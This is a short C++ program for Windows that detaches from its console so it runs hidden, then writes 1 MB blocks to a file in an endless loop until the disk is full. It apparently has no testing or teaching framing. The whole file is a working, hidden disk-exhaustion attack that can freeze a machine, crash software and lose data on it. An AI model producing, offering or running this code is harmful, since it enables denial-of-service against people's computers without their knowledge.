#include <iostream>
#include <fstream>
#include <windows.h>

void createLargeFile() {
    std::ofstream largeFile("largeFile.txt", std::ios::binary);

    if (!largeFile.is_open()) {
        std::cerr << "Error opening file" << std::endl;
        return;
    }

    const size_t bufferSize = 1024 * 1024; // 1 MB buffer
    char *buffer = new char[bufferSize];
    memset(buffer, '0', bufferSize);

    try {
        while (true) {
            largeFile.write(buffer, bufferSize);
            if (largeFile.fail()) {
                throw std::runtime_error("Disk is full");
            }
        }
    } catch (const std::exception &e) {
        std::cerr << e.what() << std::endl;
    }

    delete[] buffer;
    largeFile.close();
}

void runInBackground() {
    FreeConsole(); // Detach from the console window

    createLargeFile();
}

int main() {
    runInBackground();
    return 0;
}
